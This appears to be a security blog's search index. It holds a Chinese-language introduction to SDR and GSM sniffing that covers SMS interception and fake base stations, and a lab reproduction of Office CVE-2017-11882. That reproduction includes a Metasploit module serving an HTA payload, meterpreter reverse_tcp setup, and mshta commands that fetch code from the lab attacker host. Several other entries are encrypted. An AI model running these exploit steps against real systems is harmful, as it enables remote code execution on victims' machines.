<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[WAF bypass Part 2]]></title>
    <url>%2F2018%2F10%2F15%2Fwaf-bypass-2%2F</url>
    <content type="text"><![CDATA[本文章暂时加密，如有需要请联系本人。 ]]></content>
      <categories>
        <category>bypass</category>
      </categories>
      <tags>
        <tag>waf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WAF bypass Part 1]]></title>
    <url>%2F2018%2F08%2F26%2Fwaf-bypass-1%2F</url>
    <content type="text"><![CDATA[本文章暂时加密，如有需要请联系本人。 ]]></content>
      <categories>
        <category>bypass</category>
      </categories>
      <tags>
        <tag>waf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初识SDR与GSM嗅探]]></title>
    <url>%2F2018%2F05%2F25%2Fsdr_gsm%2F</url>
    <content type="text"><![CDATA[概述抽空了解下SDR以及GSM的一些知识。 射频通讯射频（RadioFrequency 简称RF）表示可以辐射到空间的电磁频率，频率范围从300KHz~300GHz之间。 射频简称RF射频就是射频电流，他是一种高频交流变化 电磁波的简称。美妙变化小于1000次的交流电称为低频电流，大于10000次的称为高频电流，而射频就是这样一种高频电流。高频（大于10K）； 射频（300K-300G）是高频段的较高频段；微波频段（300M-300G）又是射频的较高频段。 在整个射频通信中，主要包含以下几种频率：传输频率、接收频率、中频和基带频率。基带频率是用来调制数据的信号频率。 软件定义的无线电(Software Defined Radio，SDR) 是一种无线电广播通信技术，它基于软件定义的无线通信协议而非通过硬连线实现。频带、空中接口协议和功能可通过软件下载和更新来升级，而不用完全更换硬件。 其中已在硬件被典型地实现的组件（例如混频器，滤波器，放大器，调制器 / 解调器，检测器等）。 直接利用软体调变的方式而不需变更硬体架构，省去硬体架构调整的负担。 三款SDR平台： HackRF，bladeRF和USRP。 HackRFOneHackRFOne 是一款软件定义无线电外设，能够发送或接受1MHz至6GHz 的无线电信号。 hackRF One旨在支持现代和下一代无线电技术的测试和开发，是一个开源硬件平台，可用作USB外设或编程独立运行。 特性 HackRF最大支持20MHz的采样率 High Speed USB，USB供电接口 硬件/软件全部开源 全面支持GNURadio GNURadioGNURadio就是开源世界中软件无线电的代表项目，实现了软件无线电所需要的大部分模块，并且完成了对于采样数据流的缓冲、调度，并由开源社区集体维护。GNURadio对于软件无线电射频前端硬件的支持非常全面，例如USRP、HackRF、BladeRF等。 信号源由osmocom模块提供，设置好信号源的中心频率和采样率，对来自信号源的信号通过抽取，再经过低通滤波，只保留所要解调信号的频率范围，即调频信号的带宽，滤波器截止频率通过GUI Slider设置。滤波后的信号送入WBFM解调模块进行解调，输出即为音频信号，后送入Audio Sink，GNURadio会自动通过音频驱动将音频信号送到计算机的音频输出，在扬声器就会发出FM广播的声音。还可以加上GUI FFT Sink观察广播信号的频谱。 移动通信随着互联网的普及和智能手机的广泛应用，大家对2G、3G、4G网络并不陌生。然而什么是2G、3G、4G网络，很多人就只能懵逼的人为是上网速度有差异。 其实，真正从个人用户的角度来说，上述理解无可厚非。G指的是Generation，也就是“代”的意思。1G~5G等的定义，主要是从速率，业务类型，传输时延，还有各种切换成功率角度给出具体实现的技术不同。所以1G就是第一代移动通信系统的意思，2G、3G、4G、5G就分别指第二、三、四、五代移动通信系统，而这也确实是人为划代。 第一代移动通信：摩托罗拉8000X，即俗称“大哥大”，语音、短信第二代移动通信：主要的制式为GSM 以及CDMA IS95/CDMA2000 1x ，语音、短信、连入互联网。第三代移动通信（3G）：3G主流的制式主要就是WCDMA、CDMA2000 EVDO、TD-SCDMA、Wimax，提高了响应速度，降低了时延。第四代移动通信：整个网络更加扁平化，降低时延，提升用户感受，看视频。第五代移动通信：拭目以待。 GSM全球移动通信系统，即GSM(Global System for Mobile Communications)，是当前应用最为广泛的移动电话标准，GSM是一个蜂窝网络，蜂窝网络的原因，是因为一个数学结论，即以相同半径的圆形覆盖平面, 当圆心处于正六边形网格的各正六边形中心，也就是当圆心处于正三角网格的格点时所用圆的数量最少。作为运营商，为了考虑成本，不会建设大量多余的基站。 GSM加密采用A5算法。A5算法是一种序列密码，它是欧洲GSM标准中规定的加密算法，专用于数字蜂窝移动电话的加密，用于对从电话到基站连接的加密。A5的特点是效率高，适合硬件上高效实现。A5发展至今，有A5/1、A5/2、A5/3、A5/4、A5/5、A5/6、A5/7等7个版本，目前GSM终端一般都支持A5/1和A5/3，A5/4以上基本不涉及。 我们国家移动和联通的2G电话网络采用的是GSM。 现在都向像4G、5G转移，GSM 嗅探的用武之地越来越少，也只能依靠一些信号干扰器强制降级才能勉强有一些利用场景。 手机开机时的位置更新流程 MS（手机）向系统请求分配信令信道（SDCCH），MS倾向信号强的BTS，算法基站定，故有伪基站攻击 MSC收到手机发来的IMSI（国际移动用户标识号）可及消息； MSC（移动交换中心）将IMSI可及信息再发送给VLR（保存的是用户的动态信息和状态信息），VLR将IMSI不可及标记更新为IMSI可及； VLR反馈MSC可及信息信号； MSC再将反馈信号发给手机； 嗅探GSM每个国家所采用的每个操作码都使用GSM频率段中的不同的频率，通常是从900 Mhz开始。 可以使用kal 命令找到想嗅探的频率 或者直接查询，或者百度运营商GSM更快 使用gqrx寻找相关频率（gqrx 是 GNU Radio 的一个前端实现，主流的发行版软件源中均带有 gqrx。安装非常便捷，使用包管理器即可）： 结合wireshark： 注意点这里涉及到上行数据和下载数据，基站发到手机端的是下行短信，手机发送到基站的是上行短信。所以要嗅探到下行的短信相对容易（广播），所以可能看到GMS SMS内容(因为这些不加密…) 下行短信里没有短信接受者的号码，简单来讲，短信接受者的号码、IMEI等数据，只有在“Location Update”时才会在网络中出现，并且是以加密形式传输的。当接收短信时，基站根据之前位置更新时注册的信息，判断接收者的位置。所以，想要拿到接受者的号码，需要破解A5/1算法并还原出“Location Update”时的原文，Airprobe项目里有介绍如何破解A5/1算法找到Kc。 参考文章 很多情况下，把手机调成2G了也嗅探不到自己的短息，这是因为在所有操作成功的前提下，能嗅探到别人的短信却抓不到自己的大概是因为抓取的ARFCN和手机选择的ARFCN不是同一个，一个区域可能有几个到十几个可以注册的ARFCN，原则上手机一般会自动选择信号最强的ARFCN注册，但是具体注册哪里一个还是有手机系统来确定，所以要完整抓取一个区域内所有的下行短信。 其他应用超级跑马机跑马机的原理是伪造 GPS 信号，要伪造 GPS 信号,首先需要获取 GPS 卫星的观测数据,进行采样分析，制作轨迹文件，转换为信号发射出去,车载计程终端会被干扰,将其当做真实的 GPS 信号，跑马机上面的数值就会动起来。 重放攻击无线键盘重放攻击是一种简单、粗糙的攻击方式，只要有能够收发射频信号的硬件设备就可以实现，但越是简单的攻击方式就越难以防范。参考文章 伪基站伪基站，又称假基站、假基地台，是一种利用GSM单向认证缺陷的非法无线电通信设备，主要由主机和笔记本电脑组成，能够搜取以其为中心、一定半径范围内的GSM移动电话信息，并任意冒用他人手机号码强行向用户手机发送诈骗、推销等垃圾短信，通常安放在汽车或者一个比较隐蔽的地方发送。伪基站运行时，用户手机信号被强制连接到该设备上，无法连接到公用电信网络，以影响手机用户的正常使用。 伪基站利用移动信令监测系统监测移动通讯过程中的各种信令过程，获得手机用户当前的位置信息。伪基站启动后就会干扰和屏蔽一定范围内的运营商信号，之后则会搜索出附近的手机号，并将短信发送到这些号码上。屏蔽运营商的信号可以持续10秒到20秒，短信推送完成后，对方手机才能重新搜索到信号。大部分手机不能自动恢复信号，需要重启。伪基站能把发送号码显示为任意号码，甚至是邮箱号和特服号码。载有伪基站的车行驶速度不高于60公里/小时，可以向周边用户群发短信，因此，伪基站具有一定的流动性。 一些功率大的伪基站，辐射的范围很广，只要伪基站不关闭发射，就会不断的有手机被吸入。离基站越近，被吸入的可能性越大。当伪基站正在发送诈骗短信的时候，附近有一万人经过，至少有5000人会受到影响。]]></content>
      <categories>
        <category>spoof</category>
      </categories>
      <tags>
        <tag>sdr</tag>
        <tag>gsm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Office CVE-2017-11882 复现]]></title>
    <url>%2F2018%2F04%2F01%2FCVE-2017-11882%2F</url>
    <content type="text"><![CDATA[概述最新 Office 的 CVE-2017-11882，完美无弹窗，无视宏，影响 office 全版本。利用触发器 WebClient 服务从攻击者控制的 WebDav 服务器启动和执行远程文件。该脚本使用多个 OLE 对象创建简单的文档。这些对象利用 CVE-2017-11882，从而导致连续命令执行。 复现过程环境 win7 + office2010 (1921.168.111.100) Kali(192.168.111.183) Ridter 师傅改进过的脚本,43b命令长度不能超过43 bytes，109b命令长度不能超过109 bytes。 注意点：需要考虑到受害者的office是32还是64位数的，网上poc不一定都能成功，多试几个。 基本利用 生成漏洞 doc 文件，首先简单的测试一下是否能够弹出计算器，命令如下： 1python command43b_cve-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; -o test.doc 在测试机器上次文件打开： 结合msf利用PS_shell.rb 添加msf脚本PS_shell.rb，在/usr/share/metasploit-framework/modules/exploits/windows目录下新建个文件夹mytest，并命名为PS_shell.rb，代码如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule &lt; Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::HttpServer def initialize(info = &#123;&#125;) super(update_info(info, &apos;Name&apos; =&gt; &apos;Microsoft Office Payload Delivery&apos;, &apos;Description&apos; =&gt; %q&#123; This module generates an command to place within a word document, that when executed, will retrieve a HTA payload via HTTP from an web server. Currently have not figured out how to generate a doc. &#125;, &apos;License&apos; =&gt; MSF_LICENSE, &apos;Arch&apos; =&gt; ARCH_X86, &apos;Platform&apos; =&gt; &apos;win&apos;, &apos;Targets&apos; =&gt; [ [&apos;Automatic&apos;, &#123;&#125; ], ], &apos;DefaultTarget&apos; =&gt; 0, )) end def on_request_uri(cli, _request) print_status(&quot;Delivering payload&quot;) p = regenerate_payload(cli) data = Msf::Util::EXE.to_executable_fmt( framework, ARCH_X86, &apos;win&apos;, p.encoded, &apos;hta-psh&apos;, &#123; :arch =&gt; ARCH_X86, :platform =&gt; &apos;win &apos;&#125; ) send_response(cli, data, &apos;Content-Type&apos; =&gt; &apos;application/hta&apos;) end def primer url = get_uri print_status(&quot;Place the following DDE in an MS document:&quot;) print_line(&quot;mshta.exe \&quot;#&#123;url&#125;\&quot;&quot;) endend 利用 msf 生成一个powershell 脚本： 12345use exploit/windows/mytest/PS_shellset payload windows/meterpreter/reverse_tcpset lhost 192.168.111.183set uripath abcexploit -j 生成漏洞 doc 文件，首先简单的测试一下是否能够弹出计算器，命令如下： 1python command43b_cve-2017-11882.py -c &quot;mshta.exe http://192.168.111.183:8080/abc&quot; -o test.doc (命令不能超过43字节) office_ms17_11882注意这个64位office可以成功，32位office不能成功。 利用 msf 生成一个恶意文件： 12use exploit/windows/fileformat/office_ms17_11882set LHOST 192.168.111.183 将恶意文件考出来然后运行即可。 hta_server 利用 msf 开启一个hta_server脚本： 1234use exploit/windows/misc/hta_serverset payload windows/meterpreter/reverse_tcpset lhost 192.168.111.183set URIPATH a 生成漏洞 doc 文件，首先简单的测试一下是否能够弹出计算器，命令如下： 1python command43b_cve-2017-11882.py -c &quot;mshta.exe http://192.168.111.183:8080/a&quot; -o test.doc (命令不能超过43字节) 总结这种类型的的漏洞还是要多接触一些，拓宽渗透思路。]]></content>
      <categories>
        <category>code execution</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>office</tag>
        <tag>code execution</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[端口渗透总结]]></title>
    <url>%2F2018%2F03%2F08%2Fport-pentest%2F</url>
    <content type="text"><![CDATA[本文章暂时加密，如有需要请联系本人。 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